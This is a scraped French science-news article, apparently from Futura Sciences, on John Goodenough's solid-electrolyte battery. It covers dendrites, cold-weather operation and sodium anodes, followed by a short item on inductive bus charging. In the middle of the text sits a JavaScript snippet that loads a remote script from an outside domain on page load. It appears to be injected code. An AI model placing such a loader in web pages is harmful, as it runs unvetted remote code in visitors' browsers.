{"title": "John Goodenough, le père de la batterie lithium-ion, invente une technologie encore plus performante", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "26/11/2017", "content": "Dans les laboratoires, la recherche sur les batteries est en pleine ébullition depuis des années. Des annonces comme celles de l'inénarrable Elon Musk — la plus grande grande du monde et un modèle pour téléphone, présentés coup sur coup en novembre 2017 — témoignent d'une belle activité de R&D. En mars dernier, nous rapportions l'étonnante innovation du co-inventeur de la batterie lithium-ion, John Goodenough, qui a depuis fêté ses 95 ans. Son modèle à électrolyte solide serait trois fois plus performante et trois fois plus sûre que les autres. Elle conviendrait à des terminaux mobiles mais aussi des voitures électriques et pour le stockage d'énergie solaire. Article paru le 7 mars 2017 Le nom de John Goodenough ne vous est peut-être pas familier. Pourtant, ce professeur de génie mécanique et de science des matériaux à l'université du Texas, à Austin (États-Unis), est à l'origine d'une des inventions majeures de ces dernières décennies : la  batterie lithium-ion . Si Sony en a débuté la commercialisation, c'est bien à John Goodenough et son équipe de chercheurs de l'université d'Oxford (Royaume-Uni) que l'on doit l'identification et le développement du  matériau  servant de  cathode  aux  batteries lithium-ion  que l'on trouve aujourd'hui dans la plupart des appareils électroniques mobiles ( smartphones ,  tablettes ,  PC  portables...) et sans fil ainsi que dans les  voitures électriques . Aujourd'hui âgé de 94 ans, le professeur Goodenough continue non seulement d'enseigner, mais il va peut-être révolutionner une seconde fois le monde des batteries. En compagnie de la professeure Maria Helena Braga et d'une équipe de la  Cockrell School of Engineering  de l'université du Texas, il a développé un nouveau type de  batterie à électrolyte solide  censée allier performances, sécurité et faible coût de production.  Dans un article publié dans la revue  Energy and Environmental Science , ces scientifiques expliquent que leurs batteries offrent une densité énergétique trois fois plus élevée que celle des  batteries lithium-ion  tout en étant non inflammables, plus endurantes et compatibles avec des systèmes de charge rapide. Pour parvenir à ce résultat si prometteur, le professeur Goodenough et son équipe ont développé un électrolyte  solide  à base de verre avec une  anode  en  métal  alcalin pouvant être composée de lithium, de  sodium  ou de  potassium . Le professeur Goodenough, 94 ans, continue à enseigner à l’université du Texas tout en poursuivant ses travaux sur les batteries à électrolyte solide. ©  University of Texas at Austin                               Une batterie à électrolyte solide qui peut fonctionner jusqu'à -20 °C En optant pour un électrolyte solide, les chercheurs ont notamment pu prévenir la formation de  dendrites . Il s'agit d'excroissances se formant à la longue sous l'effet des contractions et des gonflements que subit le lithium durant les cycles charge-décharge de la batterie. Ces dendrites peuvent endommager le séparateur en  polymère  qui isole l'anode et la cathode et provoquer un  court-circuit  susceptible de déboucher sur l'incendie voire l'explosion de la batterie. Ce type de court-circuit peut se produire si la charge de la batterie est trop rapide ou si celle-ci est exposée à une température trop basse.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Or, justement, la nouvelle batterie conçue par John Goodenough a comme autre avantage de pouvoir fonctionner à des températures très basses allant jusqu'à -20 °C. Par ailleurs, elle offre une très bonne endurance. Les tests en laboratoire ont permis de réaliser 1.200 recharges sans perte de performances. Pour finir, le fait de pouvoir substituer le lithium par du sodium, extrait par exemple de l'eau de mer, offre une alternative à la fois peu onéreuse et respectueuse de l'environnement. Mais à quelle échéance peut-on s'attendre à voir cette technologie remplacer les batteries lithium-ion ? Difficile à dire. Pour le moment, le professeur Goodenough et son équipe travaillent à peaufiner le procédé, à le sécuriser par des brevets et à trouver des partenaires industriels pour réaliser des essais, notamment avec des voitures électriques. L'université du Texas précise que ces travaux ne bénéficient d'aucun financement extérieur et que des accords de licence sont en train d'être négociés avec un certain nombre d'entreprises du secteur. À suivre donc... Un jour, les bus électriques se rechargeront sans câble, par induction                       Le « biberonnage », c’est la recharge (partielle) d’un véhicule électrique sans contact, par induction, au-dessus d’un « pad », système inclus dans la chaussée. Le véhicule s’arrête à ce niveau et, automatiquement, un puissant champ magnétique génère un courant électrique dans une bobine reliée à la batterie. Connue sur les smartphones, cette recharge sans contact n’est pas encore utilisée sur la voie publique mais conviendrait bien aux bus ou aux navettes. La recherche continue…                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  batterie au lithium  |  lithium polymere batterie  |  batterie lithium polymere  |  chargeur batterie lithium  |  comment recharger batterie lithium  |  schema chargeur batterie lithium  |  john backus  |  john pemberton  |  john glenn  |  john nash", "theme": "tech"}